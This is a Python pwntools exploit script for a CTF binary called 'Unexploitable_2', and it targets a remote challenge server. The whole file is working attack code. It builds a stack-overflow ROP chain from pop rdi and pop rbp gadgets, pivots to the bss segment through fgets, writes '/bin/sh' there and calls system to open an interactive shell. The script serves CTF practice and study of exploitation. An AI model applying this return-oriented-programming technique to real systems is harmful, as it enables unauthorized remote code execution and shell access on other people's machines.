#!/usr/bin/env python3

from pwn import *

#p = process("./Unexploitable_2")
p = remote("ctf.j0n9hyun.xyz", 3029)
e = ELF("./Unexploitable_2")

context.log_level = 'debug'

_rdi_gadget = 0x0000000000400773 # pop rdi ; ret
_rbp_gadget = 0x00000000004005e0 # pop rbp ; ret
_fgets_gadget = 0x00000000004006ee # fgets function is called
_system_gadget = 0x0000000000400684 # system function is called

padding = "C".encode() * 0x18

payload = padding
payload += p64(_rbp_gadget)
payload += p64(e.bss() + 0x10 + 0x900)
payload += p64(_fgets_gadget)

p.sendline(payload)

sleep(0.3)

payload = b'/bin/sh\x00'
payload += b'C' * (0x10)
payload += p64(_rdi_gadget)
payload += p64(e.bss() + 0x900)
payload += p64(_system_gadget)

p.sendline(payload)

p.interactive()

# Ref : https://정영호.kr/208
# https://disso1p1.tistory.com/50
# https://aidencom.tistory.com/700
# https://realsung.github.io/ctfs/2019-12-26-HackCTF-Unexploitable%232

